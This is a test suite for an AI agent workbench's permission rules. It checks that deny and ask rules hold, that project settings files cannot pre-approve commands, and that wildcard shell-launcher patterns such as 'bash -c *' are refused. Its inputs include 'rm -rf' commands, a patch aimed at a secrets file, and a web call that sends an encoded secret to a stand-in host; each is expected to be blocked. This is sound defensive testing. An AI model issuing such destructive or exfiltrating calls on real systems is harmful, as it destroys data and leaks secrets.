// Permission rules and what a project's settings files may do, whichever language runs them: a security boundary, driven
// through real runs of an agent on a scripted model.
import assert from "node:assert/strict";
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { after, before, test } from "node:test";
import { open } from "./config-harness.mjs";

let workbench;

before(async () => {
  workbench = await open();
});
after(async () => {
  await workbench?.close();
});

const rule = (tool, pattern, effect) => ({ tool, pattern, effect });

test("rules decide before the approval mode: deny refuses, ask asks, allow skips Review mode, and each says where it came from", async () => {
  const root = await workbench.folder("rules", {
    ".workbench/settings.json": { permissions: { rules: [rule("code", "rm *", "deny")] } },
    ".claude/settings.json": { permissions: { ask: ["Bash(echo:*)"] } },
  });
  const setup = await workbench.chat({ root, steps: [["code", { command: "rm -rf build" }], ["code", { command: "echo hi" }], ["code", { command: "pwd -P" }]] });
  await workbench.api("POST", "/permissions/rules", { scope: "user", rule: rule("code", "pwd *", "allow") });

  const layers = await workbench.api("GET", `/permissions?agentId=${setup.agent.id}&projectId=${setup.project.id}`);
  assert.deepEqual(layers.map((item) => item.scope), ["user", "project", "project-file", "claude-file", "agent"]);
  assert.deepEqual(layers.find((item) => item.scope === "claude-file").rules, [rule("code", "echo *", "ask")]);
  assert.deepEqual(layers.map((item) => item.editable), [true, true, false, false, true]);

  const run = await workbench.start(setup, "build it");
  const { run: waiting, action } = await workbench.card(run.id);
  const denied = waiting.actions.find((item) => item.arguments.command === "rm -rf build");
  assert.equal(denied.status, "denied", "no card, and the model moves on");
  assert.match(denied.reason, /Denied by a permission rule \(\.workbench\/settings\.json: code: rm \*\)/);
  assert.equal(action.arguments.command, "echo hi");
  assert.match(action.reason, /\.claude\/settings\.json: code: echo \*/);

  await workbench.api("POST", `/runs/${run.id}/actions/${action.id}/decision`, { allow: true });
  const done = await workbench.finished(run.id);
  assert.equal(done.status, "completed", done.error);
  assert.deepEqual(done.actions.map((item) => [item.arguments.command, item.status]), [["rm -rf build", "denied"], ["echo hi", "completed"], ["pwd -P", "completed"]], "the user's rule runs pwd with no card");
  assert.match(JSON.stringify(setup.model.requests.at(-1).messages), /Denied by a permission rule/, "the model is told");
  await workbench.api("DELETE", "/permissions/rules", { scope: "user", rule: rule("code", "pwd *", "allow") });
});

test("deny and ask hold even for an agent that runs without asking", async () => {
  const root = await workbench.folder("bypass", { ".workbench/settings.json": { permissions: { rules: [rule("code", "rm *", "deny"), rule("code", "touch *", "ask")] } } });
  const setup = await workbench.chat({ root, autonomy: "bypass" });
  assert.equal(await workbench.verdict(setup, "rm -rf build"), "denied");
  assert.equal(await workbench.verdict(setup, "touch made.txt"), "asked");
  assert.equal(await workbench.verdict(setup, "echo free"), "completed", "with no rule the agent's own mode decides");
  await assert.rejects(readFile(path.join(root, "made.txt")), "the command that asked never ran");
});

test("a command is judged piece by piece: one refused piece refuses it, and allow needs every piece allowed", async () => {
  const root = await workbench.folder("segments", {});
  const setup = await workbench.chat({ root });
  await workbench.api("POST", "/permissions/rules", { scope: "project", projectId: setup.project.id, rule: rule("code", "echo *", "allow") });
  await workbench.api("POST", "/permissions/rules", { scope: "project", projectId: setup.project.id, rule: rule("code", "rm *", "deny") });
  assert.equal(await workbench.verdict(setup, "echo a && echo b"), "completed");
  assert.equal(await workbench.verdict(setup, "echo a; rm -rf dist"), "denied");
  assert.equal(await workbench.verdict(setup, "echo a | rm -rf dist"), "denied");
  assert.equal(await workbench.verdict(setup, "echo a && pwd"), "asked", "one piece without a rule: the agent's own mode decides");
  assert.equal(await workbench.verdict(setup, "echoing a"), "asked", "a prefix ends at a word");
});

test("file rules go by action and path, in a real run", async () => {
  const root = await workbench.folder("file-rules", {});
  const setup = await workbench.chat({ root });
  await workbench.api("POST", "/permissions/rules", { scope: "project", projectId: setup.project.id, rule: rule("files", "write src/**", "allow") });
  const write = async (target) => {
    setup.model.queue.push(["files", { action: "write", path: target, content: "x" }]);
    const run = await workbench.stopped((await workbench.start(setup)).id);
    if (run.status === "waiting_approval") {
      await workbench.api("POST", `/runs/${run.id}/stop`);
      await workbench.finished(run.id);
      return "asked";
    }
    return run.actions[0].status;
  };
  assert.equal(await write("src/deep/a.txt"), "completed");
  assert.equal(await readFile(path.join(root, "src/deep/a.txt"), "utf8"), "x");
  assert.equal(await write("lib/a.txt"), "asked");
  await assert.rejects(readFile(path.join(root, "lib/a.txt")));
});

test("each layer reaches only what it is for: a project's rule stays in that project, an agent's with that agent", async () => {
  const here = await workbench.folder("layer-here", {});
  const there = await workbench.folder("layer-there", {});
  const first = await workbench.chat({ root: here, name: "First" });
  const second = await workbench.chat({ root: there, name: "Second" });
  const third = await workbench.chat({ root: here, name: "Third" });
  await workbench.api("POST", "/permissions/rules", { scope: "project", projectId: first.project.id, rule: rule("code", "echo *", "allow") });
  assert.equal(await workbench.verdict(first, "echo in-project"), "completed");
  assert.equal(await workbench.verdict(second, "echo elsewhere"), "asked");

  await workbench.api("POST", "/permissions/rules", { scope: "agent", agentId: second.agent.id, rule: rule("code", "pwd *", "allow") });
  assert.equal(await workbench.verdict(second, "pwd -P"), "completed");
  assert.equal(await workbench.verdict(third, "pwd -P"), "asked");
  assert.deepEqual((await workbench.api("GET", `/permissions?agentId=${second.agent.id}`)).find((item) => item.scope === "agent").rules, [rule("code", "pwd *", "allow")]);

  await workbench.api("DELETE", "/permissions/rules", { scope: "agent", agentId: second.agent.id, rule: rule("code", "pwd *", "allow") });
  assert.equal(await workbench.verdict(second, "pwd -P"), "asked", "removed, it no longer applies");
  const left = await workbench.api("DELETE", "/permissions/rules", { scope: "project", projectId: first.project.id, rule: rule("code", "echo *", "allow") });
  assert.deepEqual(left.find((item) => item.scope === "project").rules, []);
});

test("a rule is checked before it is saved, and allow-everything is never a rule", async () => {
  const root = await workbench.folder("checks", {});
  const setup = await workbench.chat({ root });
  const good = rule("code", "echo *", "allow");
  await workbench.refused("POST", "/permissions/rules", { scope: "nowhere", rule: good }, 400, /scope must be/);
  await workbench.refused("POST", "/permissions/rules", { scope: "project-file", projectId: setup.project.id, rule: good }, 400, /edited in that file/);
  await workbench.refused("POST", "/permissions/rules", { scope: "claude-file", projectId: setup.project.id, rule: good }, 400, /edited in that file/);
  await workbench.refused("POST", "/permissions/rules", { scope: "project", rule: good }, 400, /needs projectId/);
  await workbench.refused("POST", "/permissions/rules", { scope: "agent", rule: good }, 400, /needs agentId/);
  await workbench.refused("POST", "/permissions/rules", { scope: "project", projectId: "nobody", rule: good }, 404);
  await workbench.refused("POST", "/permissions/rules", { scope: "agent", agentId: "nobody", rule: good }, 404);
  await workbench.refused("POST", "/permissions/rules", { scope: "user", rule: rule("code", "x", "maybe") }, 400);
  await workbench.refused("POST", "/permissions/rules", { scope: "user", rule: rule("code", "   ", "allow") }, 400);
  await workbench.refused("POST", "/permissions/rules", { scope: "user" }, 400);
  // A shell or a launcher with a wildcard, or a wildcard command name, allows every command as surely as `*` does.
  const launchers = [rule("code", "sh *", "allow"), rule("code", "bash -c *", "allow"), rule("code", "/bin/zsh *", "allow"), rule("code", "env *", "allow"), rule("code", "xargs *", "allow"), rule("code", "* *", "allow"), rule("code", "*sh *", "allow"), rule("code", "powershell.exe *", "allow")];
  for (const everything of [rule("code", "*", "allow"), rule("code", "**", "allow"), rule("code", " * ", "allow"), rule("*", "*", "allow"), rule("**", "**", "allow"), ...launchers]) {
    await workbench.refused("POST", "/permissions/rules", { scope: "user", rule: everything }, 400, /not a rule/);
    await workbench.refused("POST", "/permissions/rules", { scope: "project", projectId: setup.project.id, rule: everything }, 400, /not a rule/);
  }
  assert.deepEqual((await workbench.api("GET", "/permissions")).find((item) => item.scope === "user").rules, [], "nothing refused was saved");
  // A named program with a wildcard after it is still a rule, and so is denying a shell.
  for (const fine of [rule("code", "npm *", "allow"), rule("code", "shellcheck *", "allow"), rule("code", "sh *", "deny")]) {
    await workbench.api("POST", "/permissions/rules", { scope: "user", rule: fine });
    await workbench.api("DELETE", "/permissions/rules", { scope: "user", rule: fine });
  }

  // Refusing everything is a rule, and saving the same tool and pattern again changes its effect rather than adding one.
  await workbench.api("POST", "/permissions/rules", { scope: "user", rule: rule("files", "*", "deny") });
  const changed = await workbench.api("POST", "/permissions/rules", { scope: "user", rule: rule("files", "*", "ask") });
  assert.deepEqual(changed.find((item) => item.scope === "user").rules, [rule("files", "*", "ask")]);
  await workbench.api("DELETE", "/permissions/rules", { scope: "user", rule: rule("files", "*", "ask") });
});

test("a project's settings file cannot pre-approve commands: its allow rules wait for that exact set, and allow-everything is refused", async () => {
  const root = await workbench.folder("cloned", {
    ".workbench/settings.json": { permissions: { rules: [rule("code", "echo *", "allow"), rule("code", "*", "allow"), rule("*", "*", "allow"), rule("code", "rm *", "deny")] } },
  });
  const file = path.join(root, ".workbench/settings.json");
  const setup = await workbench.chat({ root });
  const projectId = setup.project.id;
  const layer = async () => (await workbench.api("GET", `/permissions?projectId=${projectId}`)).find((item) => item.scope === "project-file");

  const seen = await layer();
  assert.deepEqual(seen.rules, [rule("code", "rm *", "deny")], "a deny makes things stricter, so it applies at once");
  assert.deepEqual(seen.held, [rule("code", "echo *", "allow")]);
  assert.deepEqual(seen.refused, [rule("code", "*", "allow"), rule("*", "*", "allow")]);
  assert.equal(seen.approved, false);
  assert.equal(seen.path, ".workbench/settings.json");
  assert.equal(await workbench.verdict(setup, "echo held"), "asked", "the file does not skip the card");
  assert.equal(await workbench.verdict(setup, "rm -rf dist"), "denied");

  await workbench.refused("POST", `/projects/${projectId}/permissions/approve`, { file: ".workbench/settings.json", fingerprint: "0000000000000000" }, 409, /changed since you looked/);
  await workbench.refused("POST", `/projects/${projectId}/permissions/approve`, { file: ".claude/settings.json", fingerprint: seen.fingerprint }, 404, /no allow rules/);
  assert.equal(await workbench.verdict(setup, "echo still-held"), "asked");

  const allowed = (await workbench.api("POST", `/projects/${projectId}/permissions/approve`, { file: ".workbench/settings.json", fingerprint: seen.fingerprint })).find((item) => item.scope === "project-file");
  assert.equal(allowed.approved, true);
  assert.deepEqual(allowed.held, []);
  assert.deepEqual(allowed.rules.map((item) => `${item.effect} ${item.pattern}`), ["allow echo *", "deny rm *"]);
  assert.deepEqual(allowed.refused.length, 2, "still never allow-everything");
  assert.equal(await workbench.verdict(setup, "echo allowed"), "completed");
  assert.equal(await workbench.verdict(setup, "pwd"), "asked", "no rule allows pwd, whatever the refused rules said");

  // The approval lasts over a restart.
  await workbench.restart();
  assert.equal((await layer()).approved, true);
  assert.equal(await workbench.verdict(setup, "echo after-restart"), "completed");

  // A changed deny rule asks nothing again; a changed allow rule holds them all.
  await writeFile(file, JSON.stringify({ permissions: { rules: [rule("code", "echo *", "allow"), rule("code", "rm *", "deny"), rule("code", "sudo *", "deny")] } }));
  assert.equal((await layer()).approved, true);
  await writeFile(file, JSON.stringify({ permissions: { rules: [rule("code", "echo *", "allow"), rule("code", "pwd *", "allow")] } }));
  const changed = await layer();
  assert.equal(changed.approved, false);
  assert.deepEqual(changed.rules, []);
  assert.equal(changed.held.length, 2);
  assert.notEqual(changed.fingerprint, seen.fingerprint);
  assert.equal(await workbench.verdict(setup, "echo changed"), "asked");
  await workbench.refused("POST", `/projects/${projectId}/permissions/approve`, { file: ".workbench/settings.json", fingerprint: seen.fingerprint }, 409, /changed since you looked/);

  // Allowed again, then revoked: held again.
  await workbench.api("POST", `/projects/${projectId}/permissions/approve`, { file: ".workbench/settings.json", fingerprint: changed.fingerprint });
  assert.equal(await workbench.verdict(setup, "echo again"), "completed");
  const revoked = (await workbench.api("DELETE", `/projects/${projectId}/permissions/approve`, { file: ".workbench/settings.json" })).find((item) => item.scope === "project-file");
  assert.equal(revoked.approved, false);
  assert.equal(await workbench.verdict(setup, "echo revoked"), "asked");
});

test("Claude Code's settings file is held the same way: Bash(*) is refused, its deny applies at once, and an approval is per file", async () => {
  const root = await workbench.folder("claude-file", {
    ".claude/settings.json": { permissions: { allow: ["Bash(*)", "Bash(echo:*)", "Task"], deny: ["Bash(rm:*)"] } },
    ".workbench/settings.json": { permissions: { rules: [rule("code", "pwd *", "allow")] } },
  });
  const setup = await workbench.chat({ root });
  const projectId = setup.project.id;
  const layers = await workbench.api("GET", `/permissions?projectId=${projectId}`);
  const claude = layers.find((item) => item.scope === "claude-file");
  assert.deepEqual(claude.rules, [rule("code", "rm *", "deny")]);
  assert.deepEqual(claude.held, [rule("code", "echo *", "allow")], "what does not translate is left out");
  assert.equal(claude.refused.length, 1);
  assert.equal(await workbench.verdict(setup, "echo held"), "asked");
  assert.equal(await workbench.verdict(setup, "rm -rf dist"), "denied");

  await workbench.api("POST", `/projects/${projectId}/permissions/approve`, { file: ".claude/settings.json", fingerprint: claude.fingerprint });
  assert.equal(await workbench.verdict(setup, "echo allowed"), "completed");
  assert.equal(await workbench.verdict(setup, "pwd -P"), "asked", "the other file is still held");
});

test("Always allow saves a rule where the user chose and approves the call; a card that is gone or a rule that is too wide is refused", async () => {
  const root = await workbench.folder("always", {});
  const setup = await workbench.chat({ root });
  const projectId = setup.project.id;
  const ask = async (command) => {
    setup.model.queue.push(["code", { command }]);
    const run = await workbench.start(setup);
    return { id: run.id, ...(await workbench.card(run.id)) };
  };

  const first = await ask("echo -n one");
  await workbench.refused("POST", `/runs/${first.id}/actions/${first.action.id}/allow-always`, { scope: "nowhere" }, 400, /scope must be/);
  await workbench.refused("POST", `/runs/${first.id}/actions/${first.action.id}/allow-always`, { pattern: "*" }, 400, /not a rule/);
  assert.equal((await workbench.getRun(first.id)).status, "waiting_approval", "a refused rule approves nothing");
  const saved = await workbench.api("POST", `/runs/${first.id}/actions/${first.action.id}/allow-always`, {});
  assert.deepEqual(saved, { ok: true, rule: rule("code", "echo *", "allow"), scope: "project" }, "by default a prefix, in the project");
  assert.equal((await workbench.finished(first.id)).actions[0].status, "completed");
  await workbench.refused("POST", `/runs/${first.id}/actions/${first.action.id}/allow-always`, {}, 409, /no longer waiting/);
  assert.deepEqual((await workbench.api("GET", `/permissions?projectId=${projectId}`)).find((item) => item.scope === "project").rules, [rule("code", "echo *", "allow")]);
  assert.equal(await workbench.verdict(setup, "echo -n two"), "completed", "it does not ask again");

  // A pattern of the user's own, for this agent only.
  const second = await ask("pwd -L");
  const own = await workbench.api("POST", `/runs/${second.id}/actions/${second.action.id}/allow-always`, { scope: "agent", pattern: " pwd -L " });
  assert.deepEqual(own.rule, rule("code", "pwd -L", "allow"));
  await workbench.finished(second.id);
  assert.deepEqual((await workbench.api("GET", `/permissions?agentId=${setup.agent.id}`)).find((item) => item.scope === "agent").rules, [rule("code", "pwd -L", "allow")]);

  // Everywhere.
  const third = await ask("uname -a");
  assert.equal((await workbench.api("POST", `/runs/${third.id}/actions/${third.action.id}/allow-always`, { scope: "user" })).scope, "user");
  await workbench.finished(third.id);
  await workbench.api("DELETE", "/permissions/rules", { scope: "user", rule: rule("code", "uname *", "allow") });

  // A file call suggests its folder.
  setup.model.queue.push(["files", { action: "write", path: "src/a/b.txt", content: "x" }]);
  const write = await workbench.start(setup);
  const { action } = await workbench.card(write.id);
  assert.deepEqual((await workbench.api("POST", `/runs/${write.id}/actions/${action.id}/allow-always`, {})).rule, rule("files", "write src/a/**", "allow"));
  await workbench.finished(write.id);
  assert.equal(await readFile(path.join(root, "src/a/b.txt"), "utf8"), "x");
});

test("a chat outside a project has no project to save to", async () => {
  const setup = await workbench.chat({ steps: [["code", { command: "echo outside" }]] });
  const run = await workbench.start(setup);
  const { action } = await workbench.card(run.id);
  await workbench.refused("POST", `/runs/${run.id}/actions/${action.id}/allow-always`, {}, 400, /not in a project/);
  assert.equal((await workbench.api("POST", `/runs/${run.id}/actions/${action.id}/allow-always`, { scope: "agent" })).scope, "agent");
  assert.equal((await workbench.finished(run.id)).actions[0].status, "completed");
});

test("a patch is judged by the files it touches: a path rule stops it, and deleting a file asks", async () => {
  const root = await workbench.folder("patched", {
    "secrets/key.txt": "k\n",
    "src/a.ts": "a\n",
    ".claude/settings.json": { permissions: { deny: ["Edit(secrets/**)"] } },
  });
  const update = (file) => ["files", { action: "patch", patch: `*** Begin Patch\n*** Update File: ${file}\n@@\n-${file === "src/a.ts" ? "a" : "k"}\n+changed\n*** End Patch` }];
  const setup = await workbench.chat({ root, autonomy: "execute_when_allowed", steps: [update("secrets/key.txt"), update("src/a.ts")] });
  const run = await workbench.finished((await workbench.start(setup, "edit")).id);
  const [secret, source] = run.actions;
  assert.equal(secret.status, "denied", JSON.stringify(secret));
  assert.match(secret.reason, /\.claude\/settings\.json: files: write secrets\/\*\*/);
  assert.equal(await readFile(path.join(root, "secrets/key.txt"), "utf8"), "k\n", "the file is untouched");
  assert.equal(source.status, "completed", "a file no rule speaks of is patched as before");

  setup.model.queue.push(["files", { action: "patch", patch: "*** Begin Patch\n*** Delete File: src/a.ts\n*** End Patch" }]);
  const { action } = await workbench.card((await workbench.start(setup, "remove it")).id);
  assert.match(action.reason, /Sensitive operation/, "deleting asks in the default mode");
  assert.ok(await readFile(path.join(root, "src/a.ts"), "utf8"), "and nothing is deleted while it asks");
});

test("a task delegated to another agent asks at least as much as the chat that delegated it", async () => {
  const root = await workbench.folder("delegating", { "build/out.js": "x" });
  // A second agent that never asks, with a model that will try a risky command.
  const ops = await workbench.model({ steps: [["code", { command: "rm -rf build" }]] });
  await workbench.api("POST", "/agents", { name: "Ops", modelConnectionId: ops.connection.id, autonomy: "bypass", mcpConnectionIds: ["general-skills"] });
  const setup = await workbench.chat({
    root,
    autonomy: "execute_when_allowed",
    mcpConnectionIds: ["general-skills"],
    steps: [["delegate", { task: "Clean the build folder.", tools: "all", agent: "Ops" }]],
  });
  const parent = await workbench.start(setup, "tidy up");
  const child = await workbench.until("the delegated run to stop", async () => (await workbench.getRun(parent.id)).children?.find((run) => run.status !== "running" && run.status !== "queued"), Boolean);
  assert.equal(child.status, "waiting_approval", "Ops never asks on its own, but this task came from a chat that does");
  assert.ok(await readFile(path.join(root, "build/out.js"), "utf8"), "nothing was deleted");
  await workbench.api("POST", `/runs/${child.id}/stop`);
  await workbench.api("POST", `/runs/${parent.id}/stop`);
  await workbench.finished(parent.id);
});

test("an Ask turn opens plain addresses, but not one that could carry what it read to the site", async () => {
  const setup = await workbench.chat({
    autonomy: "bypass",
    mcpConnectionIds: ["general-skills"],
    steps: [["web", { url: "https://collect.invalid/?d=c2VjcmV0LWtleQ" }], ["web", { url: "https://docs.invalid/guide/install" }]],
  });
  const started = await workbench.api("POST", `/agents/${setup.agent.id}/runs`, { input: "read the docs", threadId: setup.thread.id, mode: "ask" });
  const run = await workbench.finished(started.id);
  const [carrying, plain] = run.actions;
  assert.equal(carrying.status, "denied");
  assert.match(carrying.reason, /Ask mode only reads, and this address carries more than where to go/);
  assert.notEqual(plain.status, "denied", "a plain address is still a read (it fails here only because .invalid does not exist)");
});
